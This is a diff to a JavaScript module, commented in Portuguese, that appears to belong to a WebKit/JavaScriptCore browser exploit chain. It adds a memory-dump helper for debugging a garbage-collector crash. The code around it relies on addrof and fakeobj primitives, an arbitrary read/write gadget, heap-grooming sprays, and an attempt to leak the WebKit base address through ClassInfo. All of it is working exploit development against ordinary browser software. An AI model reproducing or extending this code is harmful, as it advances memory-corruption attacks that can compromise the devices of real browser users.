@@ -1,7 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v01 -GC Crash)
+// js/script3/testArrayBufferVictimCrash.mjs (v02 - Com Depurador de GC)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. Script original que causa o crash mantido na íntegra para preservar a condição.
+// 2. Adicionada função 'inspectMemory' para depuração.
+// 3. Adicionadas chamadas de inspeção antes do ponto do crash do GC para análise.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -14,6 +16,50 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";
+
+// =======================================================================================
+// FUNÇÃO DE DEPURAÇÃO - INSPETOR DE MEMÓRIA
+// =======================================================================================
+async function inspectMemory(title, address, size, arb_read_func) {
+    logS3(`--- INÍCIO DUMP DE MEMÓRIA: ${title} @ ${address.toString(true)} ---`, "debug");
+    let output = "";
+    let lineBytes = new Array(16);
+
+    for (let i = 0; i < size; i++) {
+        const current_offset = i;
+        const current_addr = address.add(current_offset);
+        
+        if (i % 16 === 0) {
+            if (i > 0) {
+                output += " |" + lineBytes.map(byte => (byte >= 32 && byte <= 126) ? String.fromCharCode(byte) : '.').join('') + "|\n";
+            }
+            output += `${current_addr.toString(true)}: `;
+            lineBytes = new Array(16).fill(null);
+        }
+
+        try {
+            // arb_read_func retorna um objeto AdvancedInt64, precisamos convertê-lo.
+            const value64 = arb_read_func(current_addr, 1);
+            const byte = value64.low() & 0xFF;
+            lineBytes[i % 16] = byte;
+            output += byte.toString(16).padStart(2, '0') + " ";
+        } catch (e) {
+            output += "?? ";
+            lineBytes[i % 16] = 0;
+        }
+    }
+
+    if (size > 0) {
+        const remaining = size % 16;
+        const padding = (remaining === 0) ? 0 : 16 - remaining;
+        output += "   ".repeat(padding);
+        output += " |" + lineBytes.map(byte => byte === null ? ' ' : ((byte >= 32 && byte <= 126) ? String.fromCharCode(byte) : '.')).join('') + "|\n";
+    }
+
+    logS3(output, "leak");
+    logS3(`--- FIM DUMP DE MEMÓRIA: ${title} ---`, "debug");
+}
+
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -72,6 +118,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     };
 
     const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
+    let leaker_addr = null; // Definir aqui para escopo mais amplo
+    let arb_read_final = null; // Definir aqui para escopo mais amplo
 
     try {
         logS3("PAUSA INICIAL: Aguardando carregamento completo do ambiente e offsets.", "info");
@@ -170,10 +218,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
         const leaker = { obj_prop: null, val_prop: 0 };
-        const leaker_addr = addrof(leaker);
+        leaker_addr = addrof(leaker); // Atribuir ao escopo mais amplo
         logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
         
-        const arb_read_final = (addr) => {
+        arb_read_final = (addr) => { // Atribuir ao escopo mais amplo
             logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
             leaker.obj_prop = fakeobj(addr);
             const result = doubleToInt64(leaker.val_prop);
@@ -219,7 +267,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             throw new Error(`A verificação de L/E falhou. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
         }
 
-        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---
+        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (COM CONTROLES DE DEBUG) ---
         logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (COM CONTROLES DE DEBUG) ---", "subtest");
 
         // =================================================================
@@ -237,6 +285,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const NUM_GROOMING_OBJECTS_STAGE1 = 75000;
         const NUM_FILLER_OBJECTS_STAGE1 = 15000;
 
+        // MODIFICADO: A pausa do GC foi removida daqui
         const do_grooming = async (grooming_id) => {
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Executando Heap Grooming...`, "info");
             aggressive_feng_shui_objects = [];
@@ -248,14 +297,53 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             for (let i = 0; i < NUM_FILLER_OBJECTS_STAGE1; i++) { filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16)); }
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Spray de fillers concluído.`, "debug");
             aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
-            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Pausando para acionar GC...`, "debug");
-            await PAUSE_S3(10000);
+            // A PAUSA FOI MOVIDA PARA O BLOCO DE TESTE PRINCIPAL PARA PERMITIR INSPEÇÃO
             logS3(`  [Grooming p/ Tentativa ${grooming_id}] Concluído.`, "debug");
         };
+
          if (testes_ativos.tentativa_5_ClassInfo) {
             logS3("--- INICIANDO TENTATIVA 5: JSC::ClassInfo ---", "test");
+            
+            // ======================= INÍCIO DO CÓDIGO DE DEPURAÇÃO =======================
+            logS3("--- PREPARANDO PARA DEPURAÇÃO DO CRASH DO GC ---", "debug");
+            if (leaker_addr && typeof arb_read_final === 'function') {
+                await inspectMemory("Estado do Objeto Leaker ANTES do Grooming", leaker_addr, 64, arb_read_final);
+            } else {
+                logS3("ALERTA: 'leaker_addr' ou 'arb_read_final' não estão disponíveis para a depuração.", "warn");
+            }
+            // ======================== FIM DO CÓDIGO DE DEPURAÇÃO =========================
+
             await do_grooming(5);
             try {
+                
+                // ======================= INÍCIO DO CÓDIGO DE DEPURAÇÃO =======================
+                logS3("--- INSPECIONANDO MEMÓRIA IMEDIATAMENTE ANTES DO CRASH ESPERADO ---", "debug");
+                if (leaker_addr && typeof arb_read_final === 'function') {
+                    await inspectMemory("Estado do Objeto Leaker APÓS o Grooming", leaker_addr, 64, arb_read_final);
+
+                    const butterfly_ptr_addr = leaker_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
+                    const butterfly_ptr = arb_read_final(butterfly_ptr_addr);
+
+                    if (isAdvancedInt64Object(butterfly_ptr) && !butterfly_ptr.equals(AdvancedInt64.Zero)) {
+                        await inspectMemory("Conteúdo do Butterfly do Leaker", butterfly_ptr, 64, arb_read_final);
+                        
+                        const fake_obj_addr_inside_butterfly = arb_read_final(butterfly_ptr);
+                        
+                        if (isAdvancedInt64Object(fake_obj_addr_inside_butterfly) && !fake_obj_addr_inside_butterfly.equals(AdvancedInt64.Zero)) {
+                            await inspectMemory("Memória Alvo do Ponteiro Corrompido (o que o GC verá)", fake_obj_addr_inside_butterfly, 128, arb_read_final);
+                        } else {
+                            logS3("Ponteiro do objeto falso dentro do butterfly é nulo ou inválido.", "warn");
+                        }
+                    } else {
+                        logS3("Ponteiro para o Butterfly do Leaker é nulo ou inválido.", "warn");
+                    }
+                }
+                logS3("Pausando para acionar GC e (esperado) CRASH...", "warn");
+                await PAUSE_S3(10000); 
+                // ======================== FIM DO CÓDIGO DE DEPURAÇÃO =========================
+
+
+                // Lógica original de vazamento (provavelmente não será alcançada)
                 const target_obj = {};
                 const target_obj_addr = addrof(target_obj);
                 logS3(`  Endereço do objeto alvo para ClassInfo leak: ${target_obj_addr.toString(true)}`, "info");
